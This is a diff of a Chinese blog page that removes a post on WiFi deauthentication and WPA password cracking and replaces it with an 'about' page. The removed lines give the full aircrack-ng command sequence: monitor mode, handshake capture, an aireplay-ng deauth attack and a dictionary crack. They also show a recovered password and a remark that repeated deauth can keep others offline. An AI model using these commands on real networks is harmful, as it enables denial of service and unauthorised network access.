@@ -4,7 +4,7 @@
   <!-- 元数据 -->
   <meta charset="utf-8">
   <link rel="icon" href="/images/ns.jpg">
-  <title>wifi断网和wifi密码破解 | 只因有月月</title>
+  <title>about | 只因有月月</title>
   <meta name="author" content="yueyue" />
   <meta http-equiv="Cache-Control" content="no-transform" />
   <meta http-equiv="Cache-Control" content="no-siteapp" />
@@ -15,16 +15,14 @@
   
     <meta name="keywords" content="" />
   
-  <meta name="description" content="利用工具 Aircrack-ngkali是自带&#x2F;win版本百度吧需要一个免驱的网卡连接上网络,随便一个网络都可以输入ifconfig  查看一下网卡设备。 网卡为wlan0输入: airmon-ng   查看是否支持监听出现wlan0 就可以进行监听airmon-ng start wlan0   开启无线网卡监控输入ifconfig  网卡的设备变为wlan0mon已经开启了监听模式airodum">
-<meta property="og:type" content="article">
-<meta property="og:title" content="wifi断网和wifi密码破解">
-<meta property="og:url" content="https://yueyuelovexingxing.github.io/2021/06/28/wifi%E6%96%AD%E7%BD%91%E5%92%8Cwifi%E5%AF%86%E7%A0%81%E7%A0%B4%E8%A7%A3/index.html">
+  <meta property="og:type" content="website">
+<meta property="og:title" content="about">
+<meta property="og:url" content="https://yueyuelovexingxing.github.io/about/index-1.html">
 <meta property="og:site_name" content="只因有月月">
-<meta property="og:description" content="利用工具 Aircrack-ngkali是自带&#x2F;win版本百度吧需要一个免驱的网卡连接上网络,随便一个网络都可以输入ifconfig  查看一下网卡设备。 网卡为wlan0输入: airmon-ng   查看是否支持监听出现wlan0 就可以进行监听airmon-ng start wlan0   开启无线网卡监控输入ifconfig  网卡的设备变为wlan0mon已经开启了监听模式airodum">
 <meta property="og:locale" content="zh_CN">
 <meta property="og:image" content="https://yueyuelovexingxing.github.io/images/ns.jpg">
-<meta property="article:published_time" content="2021-06-28T09:27:05.000Z">
-<meta property="article:modified_time" content="2021-06-28T10:22:43.530Z">
+<meta property="article:published_time" content="2021-10-08T09:42:22.000Z">
+<meta property="article:modified_time" content="2021-10-08T09:47:09.940Z">
 <meta property="article:author" content="yueyue">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:image" content="https://yueyuelovexingxing.github.io/images/ns.jpg">
@@ -162,142 +160,18 @@
 
             <article>
     <div class="kratos-hentry kratos-post-inner clearfix">
-        <header class="kratos-entry-header">
-            
-                <h1 class="kratos-entry-title text-center">wifi断网和wifi密码破解</h1>
-            
-            
-            <ul class="kratos-post-meta text-center">
-                <li><i class="fa fa-calendar"></i> 2021-06-28</li>
-                <li><i class="fa fa-user"></i> 作者 yueyue</li>
-                <li>
-                    <i class="fa fa-edit"></i> 
-                    
-                    
-                        773
-                    
-                    字
-                </li>
-                
-            </ul>
-        </header>
         <div class="kratos-post-content">
-            <div id="expire-alert" class="alert alert-warning hidden" role="alert">
-                本文最后编辑于 <time datetime="1624875763530"></time> 前，其中的内容可能需要更新。
-            </div>
+            <h2 class="title-h2 text-center">about</h2>
             
-            <hr />
-            <p><strong>利用工具 Aircrack-ng<br>kali是自带/win版本百度吧<br>需要一个免驱的网卡<br>连接上网络,随便一个网络都可以</strong><br><img src="img.png" alt="img.png"><br><strong>输入ifconfig  查看一下网卡设备。 网卡为wlan0</strong><br><img src="img_1.png" alt="img_1.png"><br><strong>输入: airmon-ng   查看是否支持监听</strong><br><img src="img_2.png" alt="img_2.png"><br><strong>出现wlan0 就可以进行监听<br>airmon-ng start wlan0   开启无线网卡监控</strong><br><img src="img_3.png" alt="img_3.png"><br>输入ifconfig  网卡的设备变为wlan0mon<br><img src="img_4.png" alt="img_4.png"><br><strong>已经开启了监听模式<br>airodump-wlan0mon  查看周围的wifi网络</strong><br><img src="img_5.png" alt="img_5.png"><br><strong>出现周围的网络<br>这次实验目标为MRFZ<br>进行监听MRFZ网络信息<br>airodump-ng -c 6 –bssid 00:03:0F:C0:BD:D0 -w 6 wlan0mon<br>-c 指定频道号也就是CH<br>–bssid 指定路由器bssid  也就是BSSID<br>-w 指定抓取的数据包保存位置</strong><br><img src="img_6.png" alt="img_6.png"><br><strong>获取了一些MAC地址<br>04:8C:9A:E2:E2:B2  是我手机连接MRFZ的MAC</strong><br><img src="img_7.png" alt="img_7.png"><br><strong>输入aireplay-ng -0 50 -a 00:03:0F:BD:D0 -c 04:8C:9A:E2:E2:B2 wlan0mon<br>-0 表示发起 deauthentication攻击<br>50  好比50个包<br>-a 指定无线路由器BSSID<br>-c 指定强行断开的设备<br>输入命令后进行断网 我的手机也直接断网</strong><br><img src="img_8.png" alt="img_8.png"><br><img src="img_9.png" alt="img_9.png"><br><strong>输入aircrack-ng -a2 -b 00:03:0F:C0:BD:D0 -w 7 6-01.cap<br>-a2 代表WPA的握手包<br>-b 指定路由器BSSID<br>-w 指定字典  7位字典名称<br>6-01.cap 为上面监听MRFZ网络信息设置抓取的数据包保存的位置</strong><br><img src="8.png"><br><img src="img_10.png" alt="img_10.png"><br><strong>破解出密码为2020Network<br>密码破解需要靠强大的字典来破解<br>没有什么好玩的,好玩的也就是断网<br>断网的可以发送很多个类似数据包的   可以让联网的人一直断网,注意一点小心别人打你</strong></p>
-
         </div>
-        
-            <div class="kratos-copyright text-center clearfix">
-                <h5>本作品采用 <a rel="license nofollow" target="_blank" href="https://creativecommons.org/licenses/by-sa/4.0/">知识共享署名-相同方式共享 4.0 国际许可协议</a> 进行许可</h5>
-            </div>
-        
         <footer class="kratos-entry-footer clearfix">
-            
-                <div class="post-like-donate text-center clearfix" id="post-like-donate">
-                
-                    <a class="donate" href="javascript:;"><i class="fa fa-bitcoin"></i> 打赏</a>
-                
-                
-                    <a class="share" href="javascript:;"><i class="fa fa-share-alt"></i> 分享</a>
-                    <div class="share-wrap" style="display: none;">
-    <div class="share-group">
-        <a href="javascript:;" class="share-plain qq" onclick="share('qq');" rel="nofollow">
-            <div class="icon-wrap">
-                <i class="fa fa-qq"></i>
-            </div>
-        </a>
-        <a href="javascript:;" class="share-plain qzone" onclick="share('qzone');" rel="nofollow">
-            <div class="icon-wrap">
-                <i class="fa fa-star"></i>
-            </div>
-        </a>
-        <a href="javascript:;" class="share-plain weixin pop style-plain" rel="nofollow">
-            <div class="icon-wrap">
-                <i class="fa fa-weixin"></i>
-            </div>
-            <div class="share-int">
-                <div class="qrcode" id="wechat-qr"></div>
-                <p>打开微信“扫一扫”，打开网页后点击屏幕右上角分享按钮</p>
-            </div>
-        </a>
-        <a href="javascript:;" class="share-plain weibo" onclick="share('weibo');" rel="nofollow">
-            <div class="icon-wrap">
-                <i class="fa fa-weibo"></i>
-            </div>
-        </a>
-        <a href="javascript:;" class="share-plain facebook style-plain" onclick="share('facebook');" rel="nofollow">
-            <div class="icon-wrap">
-                <i class="fa fa-facebook"></i>
-            </div>
-        </a>
-        <a href="javascript:;" class="share-plain twitter style-plain" onclick="share('twitter');" rel="nofollow">
-            <div class="icon-wrap">
-                <i class="fa fa-twitter"></i>
-            </div>
-        </a>
-    </div>
-    <script type="text/javascript">
-        $(()=>{
-            new QRCode("wechat-qr", {
-                text: "https://yueyuelovexingxing.github.io/2021/06/28/wifi%E6%96%AD%E7%BD%91%E5%92%8Cwifi%E5%AF%86%E7%A0%81%E7%A0%B4%E8%A7%A3/",
-                width: 150,
-                height: 150,
-                correctLevel : QRCode.CorrectLevel.H
-            });
-        });
-        function share(dest) {
-            const qqBase        = "https://connect.qq.com/widget/shareqq/index.html?";
-            const weiboBase     = "https://service.weibo.com/share/share.php?";
-            const qzoneBase     = "https://sns.qzone.qq.com/cgi-bin/qzshare/cgi_qzshare_onekey?";
-            const facebookBase  = "https://www.facebook.com/sharer/sharer.php?";
-            const twitterBase   = "https://twitter.com/intent/tweet?";
-            const hostUrl       = "https://yueyuelovexingxing.github.io/2021/06/28/wifi%E6%96%AD%E7%BD%91%E5%92%8Cwifi%E5%AF%86%E7%A0%81%E7%A0%B4%E8%A7%A3/";
-            const title         = "「wifi断网和wifi密码破解」";
-            const excerpt       = `利用工具 Aircrack-ngkali是自带/win版本百度吧需要一个免驱的网卡连接上网络,随便一个网络都可以输入ifconfig  查看一下网卡设备。 网卡为wlan0输入: airmon-ng   查看是否支持监听出现wlan0...`;
-            let _URL;
-            switch (dest) {
-                case "qq"       : _URL = qqBase+"url="+hostUrl+"&title="+title+"&desc=&summary="+excerpt+"&site=cxpy";     break;
-                case "weibo"    : _URL = weiboBase+"url="+hostUrl+"&title="+title+excerpt;                                 break;
-                case "qzone"    : _URL = qzoneBase+"url="+hostUrl+"&title="+title+"&desc=&summary="+excerpt+"&site=cxpy";  break;
-                case "facebook" : _URL = facebookBase+"u="+hostUrl;                                                        break;
-                case "twitter"  : _URL = twitterBase+"text="+title+excerpt+"&url="+hostUrl;                                break;
-            }
-            window.open(_URL);
-        };
-    </script>
-</div>
-                
-                </div>
-            
             <div class="footer-tag clearfix">
-                <div class="pull-left">
-                <i class="fa fa-tags"></i>
-                    
-                </div>
                 <div class="pull-date">
-                <span>最后编辑：2021-06-28</span>
+                <span>最后编辑：2021-10-08</span>
                 </div>
             </div>
         </footer>
     </div>
-    
-        <nav class="navigation post-navigation clearfix" role="navigation">
-            
-            <div class="nav-previous clearfix">
-                <a title=" 一次挖洞的经历" href="/2021/06/04/一次挖洞的经历/">&lt; 上一篇</a>
-            </div>
-            
-            
-            <div class="nav-next clearfix">
-                <a title=" 中职类国赛模块A的题" href="/2021/07/23/中职类国赛模块A的题/">下一篇 &gt;</a>
-            </div>
-            
-        </nav>
-    
     
 </article>
 
